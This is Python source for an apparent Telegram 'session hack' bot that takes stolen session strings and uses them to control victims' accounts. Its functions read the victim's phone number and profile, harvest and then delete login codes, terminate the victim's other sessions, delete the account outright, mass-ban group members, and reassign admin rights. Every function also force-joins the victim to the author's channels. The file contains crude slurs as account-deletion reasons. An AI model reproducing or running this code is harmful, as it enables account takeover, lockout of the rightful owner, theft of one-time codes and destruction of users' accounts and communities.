import asyncio
import pyrogram 
from pyrogram import Client , enums
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from HackSessionBot import (
     API_ID,
     API_HASH,
     CHAT )
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
from HackSessionBot.Helpers.data import info
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
from pyrogram.errors import FloodWait
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions as ok
from pyrogram.types import ChatPrivileges
from telethon.tl.types import ChannelParticipantsAdmins

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()                          
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join("@Steve_Projects"))
                await steve(join(CHAT))
            except Exception as e:
                print(e)
            k = await steve(GetAdminedPublicChannelsRequest())            
            for x in k.chats:                
                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
            await steve.disconnect()
                 
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
    except Exception as idk:
        err += str(idk)                                             
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join("@Steve_Projects"))
                await steve(join(CHAT))
            except Exception as e:
                print(e)
            k = await steve.get_me()  
            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
            await steve.disconnect()
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                k = await stark.get_me()
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg    


RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

async def banall(session,id):
    err = ""
    msg = ""
    all = 0
    bann = 0
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join(CHAT))
                await steve(join(CHAT))
            except Exception as e:
                print(e)
            admins = await steve.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admins_id = [i.id for i in admins]                
            async for user in steve.iter_participants(gc_id):
                all += 1
                try:
                    if user.id not in admins_id:
                       await steve(EditBannedRequest(gc_id, user.id, RIGHTS))
                       bann += 1
                       await asyncio.sleep(0.1)
                except Exception:
                    await asyncio.sleep(0.1)
            await steve.disconnect()
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                async for members in stark.get_chat_members(gc_id):  
                    all += 1                
                    try:                                          
                        await stark.ban_chat_member(gc_id,members.user.id)  
                        bann += 1                  
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass 
                          
    except Exception as idk:
        err += str(idk) 
    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                                            
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg

async def get_otp(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))
            except Exception as e:
                print(e)
            async for x in steve.iter_messages(777000, limit=2):               
                i += f"\n{x.text}\n"
                await steve.delete_dialog(777000)
            await steve.disconnect() 
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                ok = []
                async for message in stark.get_chat_history(777000,limit=2):
                    i += f"\n{message.text}\n"                                   
                    ok.append(message.id)                 
                await stark.delete_messages(777000,ok)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def join_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            await steve(join(gc_id))            
            await steve.disconnect() 
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                await stark.join_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "Jᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def leave_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            await steve(leave(gc_id))            
            await steve.disconnect() 
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                await stark.leave_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def del_ch(session,id):
    '''
    try nhi kia error aaye to btana
    '''
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            await steve(dc(gc_id))            
            await steve.disconnect() 
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                await stark.invoke(
                    functions.channels.DeleteChannel(channel= await stark.resolve_peer(gc_id)))
            
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"

async def check_2fa(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_Group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            try:
                await steve.edit_2fa("idkbsdkjsj")
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
                
            except Exception as e:
                print(e)
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                        
            await steve.disconnect() 
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
               # try:
                yes = await stark.invoke(functions.account.GetPassword())
                if yes.has_password:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                else:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def terminate_all(session):
    err = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_group"))
                await steve(join("@Steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            await steve(rt())
            await steve.disconnect() 
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_testing_group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                await stark.invoke(functions.auth.ResetAuthorizations())
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"

      
async def del_acc(session):
    err = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
            await steve.disconnect() 
                             
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)    
                await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."

      
FULL_PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,    
    can_invite_users=True)

PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True)

async def piromote(session,gc_id,user_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            try:
                await steve.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
            except:
                await steve.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
            await steve.disconnect()                              
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)
                try:    
                    await stark.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
                except:
                    await stark.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."


DEMOTE = ChatPrivileges(
        can_change_info=False,
        can_invite_users=False,
        can_delete_messages=False,
        can_restrict_members=False,
        can_pin_messages=False,
        can_promote_members=False,
        can_manage_chat=False,
        can_manage_video_chats=False,
    )

async def demote_all(session,gc_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                await steve(join("@Devs_Testing_group"))
                await steve(join("@steve_projects"))
                await steve(join(CHAT))                
            except Exception as e:
                print(e)
            async for x in steve.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await steve.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    await steve.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
          
            await steve.disconnect()                              
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Devs_Testing_Group")
                    await stark.join_chat("@steve_projects")
                    await stark.join_chat(CHAT)
                except Exception as e:
                    print(e)
                async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    await stark.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      
